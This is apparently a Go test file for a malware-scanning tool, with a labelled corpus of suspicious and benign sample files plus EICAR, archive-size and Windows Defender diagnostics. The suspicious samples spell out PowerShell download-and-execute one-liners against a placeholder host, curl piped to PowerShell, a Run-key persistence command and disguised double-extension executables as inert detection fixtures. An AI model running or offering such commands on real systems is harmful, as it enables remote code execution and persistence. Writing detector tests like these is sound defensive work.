package main

import (
 "archive/zip"
 "bytes"
 "context"
 "fmt"
 "os"
 "path/filepath"
 "runtime"
 "strings"
 "testing"
 "time"
)
func stage3Archive(t *testing.T, entries map[string][]byte) []byte {
 t.Helper()
 var b bytes.Buffer
 z:=zip.NewWriter(&b)
 for name,data:=range entries {
  w,err:=z.Create(name); if err!=nil {t.Fatal(err)}
  if _,err=w.Write(data);err!=nil{t.Fatal(err)}
 }
 if err:=z.Close();err!=nil{t.Fatal(err)}
 return b.Bytes()
}
// Independent from the prior scanner-specific fixtures. All sample files are
// inert text or ZIP archives. No scripts, shortcuts or malware are executed.
func TestStage3HoldoutCorpus(t *testing.T) {
 remote:="IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/not-real')"
 nested:=stage3Archive(t,map[string][]byte{"level.zip":stage3Archive(t,map[string][]byte{"note.txt.exe":[]byte("inert")})})
 cases:=[]struct{name,file string;data []byte; suspicious bool}{
  {"pipe to IEX","a.ps1",[]byte("Invoke-WebRequest 'http://example.invalid/not-real' | IEX"),true},
  {"REST to expression","b.ps1",[]byte("Invoke-RestMethod 'http://example.invalid/not-real' | Invoke-Expression"),true},
  {"download bytes and dynamic script","c.ps1",[]byte("[ScriptBlock]::Create((New-Object Net.WebClient).DownloadData('http://example.invalid/not-real'))"),true},
  {"late tail command","d.ps1",append(bytes.Repeat([]byte("# harmless filler\n"),20000),[]byte(remote)...),true},
  {"curl to interpreter","e.cmd",[]byte("curl https://example.invalid/unused | powershell.exe"),true},
  {"Run key persistence","f.cmd",[]byte(`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Example /t REG_SZ /d "example.exe"`),true},
  {"alternate encoded command","g.cmd",[]byte("powershell.exe -en AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),true},
  {"shortcut-like encoded content","h.lnk",[]byte("powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),true},
  {"nested archive","i.zip",stage3Archive(t,map[string][]byte{"inside.zip":stage3Archive(t,map[string][]byte{"document.pdf.exe":[]byte("inert")})}),true},
  {"triple nested archive","j.zip",stage3Archive(t,map[string][]byte{"inside.zip":nested}),true},
  {"benign download","normal1.ps1",[]byte("Invoke-WebRequest https://example.invalid/a -OutFile x.txt"),false},
  {"benign expression","normal2.ps1",[]byte("Invoke-Expression 'Write-Output abc'"),false},
  {"comment-only PowerShell","comments.ps1",[]byte("# "+remote+"\nWrite-Output 'hello'"),false},
  {"comment-only JS","comments.js",[]byte("// "+remote+"\nconsole.log('hello')"),false},
  {"ordinary EXE placeholder","setup.exe",[]byte("benign"),false},
  {"registry export","export.cmd",[]byte(`reg export HKCU\Software\Microsoft\Windows\CurrentVersion\Run backup.reg`),false},
  {"normal zip","normal.zip",stage3Archive(t,map[string][]byte{"inner.zip":stage3Archive(t,map[string][]byte{"readme.txt":[]byte("hello")})}),false},
 }
 dir:=t.TempDir()
 tp,tn,fp,fn:=0,0,0,0
 for i,c:=range cases {
  p:=filepath.Join(dir,fmt.Sprintf("%02d",i),c.file)
  if err:=os.MkdirAll(filepath.Dir(p),0700);err!=nil{t.Fatal(err)}
  if err:=os.WriteFile(p,c.data,0600);err!=nil{t.Fatal(err)}
  st,err:=os.Stat(p);if err!=nil{t.Fatal(err)}
  flagged:=inspectFile(p,st)!=nil
  switch {
  case flagged && c.suspicious:tp++
  case !flagged && !c.suspicious:tn++
  case flagged:fp++;t.Logf("FALSE FLAG: %s",c.name)
  default:fn++;t.Logf("MISSED: %s",c.name)
  }
 }
 t.Logf("STAGE3 HOLDOUT TP=%d FN=%d FP=%d TN=%d",tp,fn,fp,tn)
 if tp!=10||fn!=0||fp!=0||tn!=7{t.Fatal("independent holdout regression")}
}
func TestStage3ExactEICARAndArchiveLimits(t *testing.T){
 testCases:=[]struct{name string;data []byte;flag bool}{
  {"exact",append([]byte(nil),eicar...),true},
  {"with whitespace",append(append([]byte(nil),eicar...),[]byte("\r\n \t")...),true},
  {"quoted in document",append([]byte("Example: "),eicar...),false},
  {"extra non-whitespace",append(append([]byte(nil),eicar...),'X'),false},
  {"truncated",eicar[:67],false},
  {"oversized",append(append([]byte(nil),eicar...),bytes.Repeat([]byte(" "),61)...),false},
 }
 for _,c:=range testCases{if isExactEICAR(c.data)!=c.flag{t.Errorf("EICAR case %s incorrect",c.name)}}
 data:=stage3Archive(t,map[string][]byte{"large.txt":bytes.Repeat([]byte("A"),8*1024*1024)})
 p:=filepath.Join(t.TempDir(),"large.zip")
 if err:=os.WriteFile(p,data,0600);err!=nil{t.Fatal(err)}
 st,_:=os.Stat(p);start:=time.Now()
 if f:=inspectFile(p,st);f!=nil{t.Fatalf("false flag: %+v",f)}
 t.Logf("STAGE3 COMPRESSED ARCHIVE bytes=%d scan=%s",len(data),time.Since(start))
}
func TestStage3WindowsBuiltInBenignDiagnostic(t *testing.T){
 if runtime.GOOS!="windows"{t.Skip("Windows-only diagnostic")}
 roots:=[]string{`C:\Windows\System32`,`C:\Windows\SysWOW64`,`C:\Program Files`}
 scanned,flagged:=0,0
 for _,root:=range roots {
  count:=0
  _=filepath.WalkDir(root,func(path string,e os.DirEntry,err error)error{
   if err!=nil{return nil}
   if e.IsDir(){if path!=root{return filepath.SkipDir};return nil}
   if count>=300{return filepath.SkipAll}
   low:=strings.ToLower(path)
   if !strings.HasSuffix(low,".exe")&&!strings.HasSuffix(low,".dll")&&!strings.HasSuffix(low,".ps1"){return nil}
   count++
   info,err:=e.Info();if err!=nil{return nil}
   if f:=inspectFile(path,info);f!=nil{flagged++;t.Logf("PRESUMED BENIGN FLAG: %s score=%d reasons=%v",path,f.Score,f.Reasons)}
   scanned++
   return nil
  })
 }
 t.Logf("WINDOWS BUILT-IN SAMPLE inspected=%d flagged=%d (presumed benign, not verified labels)",scanned,flagged)
}
func TestStage3DefenderCleanDiagnostic(t *testing.T){
 if runtime.GOOS!="windows"{t.Skip("Windows-only diagnostic")}
 if defenderEXE()==""{t.Skip("Defender CLI not present")}
 dir:=t.TempDir()
 if err:=os.WriteFile(filepath.Join(dir,"ordinary.txt"),[]byte("plain text"),0600);err!=nil{t.Fatal(err)}
 ctx,cancel:=context.WithTimeout(context.Background(),20*time.Second);defer cancel()
 a:=newApp(nil)
 err:=a.runDefender(ctx,"custom",dir)
 if err!=nil{t.Skipf("Defender CLI unavailable/blocked on runner: %v",err)}
 _,fs:=a.snapshot()
 if len(fs)>0{t.Fatalf("Defender reported threat in harmless diagnostic: %+v",fs)}
 t.Log("Defender clean custom scan succeeded. Does not establish Defender threat-detection coverage.")
}
